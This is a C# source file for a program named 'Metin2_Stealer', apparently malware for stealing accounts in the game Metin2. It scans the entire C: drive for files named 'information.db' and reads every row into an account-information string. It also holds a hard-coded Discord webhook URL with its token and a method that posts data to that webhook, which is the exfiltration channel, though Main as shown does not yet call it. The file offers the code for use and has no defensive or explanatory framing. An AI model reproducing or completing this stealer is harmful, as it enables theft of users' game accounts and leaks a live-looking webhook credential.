using MBW.Utilities.ManagedSqlite.Core;
using MBW.Utilities.ManagedSqlite.Core.Tables;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Xml;
using System.Xml.Serialization;

namespace Metin2_Stealer
{
    internal class Program
    {
        private readonly WebClient dWebClient = new WebClient();
        private static NameValueCollection discord = new NameValueCollection();
        public static string WebHook = "https://discord.com/api/webhooks/1035886035734900778/W6VwtV2bFuP5bi-0jE1ba73MoGjOJezL41MAuUWbjl_1A4TtAdAdMrRqVxErGZHeL5_r";
        public static string accInformation;
        static void Main(string[] args)
        {
            foreach (var file in GetFiles("C:\\", "information.db")) // DB Dosya
            {
                    using (FileStream fs = File.OpenRead(file))
                    using (Sqlite3Database db = new Sqlite3Database(fs))
                    {
                        IEnumerable<Sqlite3SchemaRow> tables = db.GetTables();

                        foreach (Sqlite3SchemaRow table in tables)
                        {

                            if (table.Type == "table")
                            {
                                Sqlite3Table tableData = db.GetTable(table.Name);

                                foreach (Sqlite3Row row in tableData.EnumerateRows())
                                {
                                    foreach (object obj in row.ColumnData)
                                    {
                                        Console.Write(" ");

                                        if (obj == null)
                                            Console.Write(" <null> ");
                                        else
                                        {
                                            string veri = obj.ToString().ToLower().Replace("true", "").Replace("false", ""); // Gereksiz verileri siler.

                                            StringBuilder build = new StringBuilder();
                                            build.Append(veri);

                                            accInformation = build.ToString();

                                            Console.Write(accInformation);
                                        }
                                    }
                                    Console.WriteLine("");
                                }
                            }
                        }
                    } 
                }
     

            Console.Read();
        }

     
        public static IEnumerable<string> GetFiles(string root, string spec)
        {
            var pending = new Stack<string>(new[] { root });

            while (pending.Count > 0)
            {
                var path = pending.Pop();
                IEnumerator<string> fileIterator = null;

                try
                {
                    fileIterator = Directory.EnumerateFiles(path, spec).GetEnumerator();
                }

                catch { }

                if (fileIterator != null)
                {
                    using (fileIterator)
                    {
                        while (true)
                        {
                            try
                            {
                                if (!fileIterator.MoveNext())
                                    break;
                            }

                            catch { break; }

                            yield return fileIterator.Current;
                        }
                    }
                }

                IEnumerator<string> dirIterator = null;

                try
                {
                    dirIterator = Directory.EnumerateDirectories(path).GetEnumerator();
                }

                catch { }

                if (dirIterator != null)
                {
                    using (dirIterator)
                    {
                        while (true)
                        {
                            try
                            {
                                if (!dirIterator.MoveNext())
                                    break;
                            }

                            catch { break; }

                            pending.Push(dirIterator.Current);
                        }
                    }
                }
            }
        }
        public static void SendMessage(string msgSend, string title)
        {
            WebRequest wr = (HttpWebRequest)WebRequest.Create(WebHook);

            wr.ContentType = "application/json";
            wr.Method = "POST";

            using (var sw = new StreamWriter(wr.GetRequestStream()))
            {
                string json = JsonConvert.SerializeObject(new
                {
                    embeds = new[]
                    {
                        new
                        {
                            title = title,
                            description = msgSend
                        }
                    }
                });
                sw.Write(json);
            }
            var response = (HttpWebResponse)wr.GetResponse();
        }
    }
}
